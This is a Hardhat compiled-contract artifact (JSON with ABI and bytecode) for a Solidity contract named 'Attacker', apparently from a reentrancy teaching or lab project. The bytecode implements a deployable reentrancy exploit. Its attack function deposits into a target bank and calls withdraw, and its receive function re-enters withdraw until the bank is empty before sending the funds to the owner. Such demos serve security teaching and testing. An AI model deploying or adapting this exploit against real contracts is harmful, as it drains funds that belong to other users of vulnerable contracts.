{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attacker",
  "sourceName": "contracts/Attacker.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_bank",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "bank",
      "outputs": [
        {
          "internalType": "contract IBank",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x60a060405234801561001057600080fd5b506040516109d13803806109d1833981810160405281019061003291906101b7565b61004e61004361008860201b60201c565b61009060201b60201c565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1681525050506101e4565b600033905090565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061018482610159565b9050919050565b61019481610179565b811461019f57600080fd5b50565b6000815190506101b18161018b565b92915050565b6000602082840312156101cd576101cc610154565b5b60006101db848285016101a2565b91505092915050565b6080516107b86102196000396000818160570152818160950152818161024d0152818161027101526102f201526107b86000f3fe60806040526004361061004e5760003560e01c8063715018a61461016e57806376cdb03b146101855780638da5cb5b146101b05780639e5faafc146101db578063f2fde38b146101e557610169565b366101695760007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16311115610118577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100fb57600080fd5b505af115801561010f573d6000803e3d6000fd5b50505050610167565b61012061020e565b73ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610165573d6000803e3d6000fd5b505b005b600080fd5b34801561017a57600080fd5b50610183610237565b005b34801561019157600080fd5b5061019a61024b565b6040516101a791906105be565b60405180910390f35b3480156101bc57600080fd5b506101c561020e565b6040516101d291906105fa565b60405180910390f35b6101e361026f565b005b3480156101f157600080fd5b5061020c60048036038101906102079190610646565b610372565b005b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b61023f6103f5565b6102496000610473565b565b7f000000000000000000000000000000000000000000000000000000000000000081565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102d757600080fd5b505af11580156102eb573d6000803e3d6000fd5b50505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561035857600080fd5b505af115801561036c573d6000803e3d6000fd5b50505050565b61037a6103f5565b600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16036103e9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103e0906106f6565b60405180910390fd5b6103f281610473565b50565b6103fd610537565b73ffffffffffffffffffffffffffffffffffffffff1661041b61020e565b73ffffffffffffffffffffffffffffffffffffffff1614610471576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161046890610762565b60405180910390fd5b565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061058461057f61057a8461053f565b61055f565b61053f565b9050919050565b600061059682610569565b9050919050565b60006105a88261058b565b9050919050565b6105b88161059d565b82525050565b60006020820190506105d360008301846105af565b92915050565b60006105e48261053f565b9050919050565b6105f4816105d9565b82525050565b600060208201905061060f60008301846105eb565b92915050565b600080fd5b610623816105d9565b811461062e57600080fd5b50565b6000813590506106408161061a565b92915050565b60006020828403121561065c5761065b610615565b5b600061066a84828501610631565b91505092915050565b600082825260208201905092915050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f206160008201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b60006106e0602683610673565b91506106eb82610684565b604082019050919050565b6000602082019050818103600083015261070f816106d3565b9050919050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572600082015250565b600061074c602083610673565b915061075782610716565b602082019050919050565b6000602082019050818103600083015261077b8161073f565b905091905056fea26469706673582212206215b6312d8418f5e1937ffda143316a3e480a8edda853dd3f28c7d0285ec69d64736f6c63430008110033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}